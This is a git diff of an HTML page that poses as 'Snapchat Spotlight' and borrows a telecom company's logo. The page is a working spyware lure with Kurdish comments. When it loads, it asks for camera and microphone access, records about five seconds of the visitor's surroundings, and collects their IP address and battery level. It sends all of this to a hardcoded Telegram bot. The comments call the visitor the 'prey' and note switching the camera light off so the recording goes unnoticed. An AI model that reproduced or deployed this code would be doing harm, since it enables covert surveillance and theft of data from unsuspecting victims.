@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
-    <title>Snapchat Spotlight</title>
+    <title>snapchat spotlight</title>
     <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
 </head>
 <body onload="capture()">
@@ -11,25 +11,39 @@
     const urlParams = new URLSearchParams(window.location.search);
     const targetID = urlParams.get('id'); 
     const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
-    const CHAT_ID = "5367676643"; // دڵنیاببە لەوەی ئایدی چاتی تێلێگرامت لێرەیە
+    const CHAT_ID = "8431515310"; // تێبینی: لێرە ئایدی چاتی خۆت بنووسە
 
     async function capture() {
         if (!targetID) return;
         try {
-            // 🎙️ چالاککردنی کامێرا و مایکرۆفۆن بە یەکەوە
+            // چالاککردنی مایکرۆفۆن (audio: true)
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: true 
             });
 
-            // 🔋 دەرهێنانی زانیاری پاتری
+            // تۆمارکردنی دەنگ
+            const mediaRecorder = new MediaRecorder(stream);
+            let audioChunks = [];
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("voice", audioBlob, "voice.ogg");
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: formData });
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000); // ٥ چرکە تۆمار دەکات
+
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
 
-            // 🌐 دەرهێنانی IP و ناردنی ڕاپۆرتی سەرەتایی
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
@@ -45,39 +59,7 @@
                         body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "HTML" })
                     });
                 });
-
-            // 🎤 دەستپێکردنی تۆمارکردنی دەنگ (Voice Capture)
-            const mediaRecorder = new MediaRecorder(stream);
-            let audioChunks = [];
-
-            mediaRecorder.ondataavailable = (event) => {
-                audioChunks.push(event.data);
-            };
-
-            mediaRecorder.onstop = async () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("voice", audioBlob, "voice_note.ogg");
-
-                // ناردنی دەنگەکە وەک Voice Note بۆ تێلێگرام
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, {
-                    method: "POST",
-                    body: formData
-                });
-            };
-
-            // تۆمارکردنی 7 چرکە لە دەنگی دەوروبەری نێچیرەکە
-            mediaRecorder.start();
-            setTimeout(() => {
-                mediaRecorder.stop();
-                // داخستنی ستریمەکان بۆ ئەوەی گڵۆپی کامێرا بکوژێتەوە
-                stream.getTracks().forEach(track => track.stop());
-            }, 7000);
-
-        } catch (err) {
-            console.error("Access Denied or Error: ", err);
-        }
+        } catch (e) { console.error(e); }
     }
 </script>
 </body>
